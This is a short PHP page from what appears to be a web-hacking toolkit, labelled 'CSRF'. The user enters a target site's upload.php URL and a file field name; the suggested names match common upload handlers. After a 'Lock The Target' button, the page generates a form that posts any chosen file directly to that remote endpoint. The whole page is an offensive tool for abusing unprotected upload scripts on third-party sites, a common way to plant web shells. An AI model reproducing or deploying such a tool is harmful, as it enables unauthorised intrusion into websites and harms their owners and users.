<?php
$judul=@CSRF;
include'sec.php';
error_reporting(0);
?>
<?php include 'helixdata/head.php'; 
?>
<body id="page-top">
<?php include 'helixdata/sidebar.php'; 
?>
<?php include 'helixdata/topcontent.php'; 
?>

 <!-- Begin Page Content -->
                <div class="container-fluid">
                    
<!-- Tools Card -->
                            <div class="card shadow mb-4">
                                <div class="card-header py-3">
                                    <center><h6 class="m-0 font-weight-bold text-primary"><?php echo str_replace("_", " ", "$judul"); ?></h6></center>
                                </div>
                                    <form method="post">
<font size="5px">
URL: <input type="url" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" class="form-control text-danger" autocomplete="off" required>
<br>
POST FILE: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / uploadfile / dll" class="form-control text-danger" autocomplete="off" required></font>
<center>
    <br>
<input type="submit" name="d" value="Lock The Target" class="btn btn-outline-info">
		<br>
</center><br></form></div>
                            </div> </div>
<?php
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
$pf =htmlspecialchars($pf);
$url =htmlspecialchars($url);
if($d) {
	echo "<center><font face='Inconsolata' color='red'> $url  Status -> </font> <font face='Inconsolata' color='lime'> Locked</font> </center>";
    echo "<center><form method='post'  target='_blank' action='$url' enctype='multipart/form-data' >
<label class='custom-file'>
<input type='file' name='$pf'/>
<input type='submit' name='d' value='Go!' class='btn btn-outline-danger' ></center></form>"; 
}
?>
                                
            <!-- End of Main Content -->
<?php include'helixdata/footer.php' ?>